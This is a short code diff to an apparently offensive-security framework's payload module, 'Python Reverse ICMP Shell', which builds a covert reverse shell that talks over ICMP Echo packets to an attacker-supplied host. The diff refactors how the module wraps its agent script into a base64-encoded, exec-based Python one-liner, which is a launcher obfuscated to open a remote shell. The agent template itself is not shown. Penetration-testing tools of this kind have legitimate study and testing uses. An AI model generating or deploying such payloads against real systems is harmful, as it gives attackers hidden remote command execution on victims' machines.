@@ -97,6 +97,8 @@ if __name__ == "__main__":
 
 
 class Module(Payload):
+    CLIENT_LANGUAGE = "python"
+
     __info__ = {
         "name": "Python Reverse ICMP Shell",
         "description": "Covert reverse shell over ICMP Echo packets (requires scapy + root/CAP_NET_RAW)",
@@ -112,13 +114,9 @@ class Module(Payload):
     shell_binary = OptString("/bin/bash", "Shell for command execution", False, advanced=True)
 
     def generate(self):
-        import base64
-
         shell = "/bin/bash" if str(self.shell_binary or "/bin/bash") == "/bin/bash" else str(self.shell_binary)
         script = (
             _ICMP_AGENT_TEMPLATE.replace("__LHOST__", str(self.lhost))
             .replace("__SHELL__", shell.replace("\\", "\\\\").replace('"', '\\"'))
         )
-        py = str(self.python_binary or "python3")
-        enc = base64.b64encode(script.encode()).decode("ascii")
-        return f'{py} -c "import base64;exec(base64.b64decode(\'{enc}\').decode())"'
+        return self._encode_python_one_liner(script, self.python_binary)
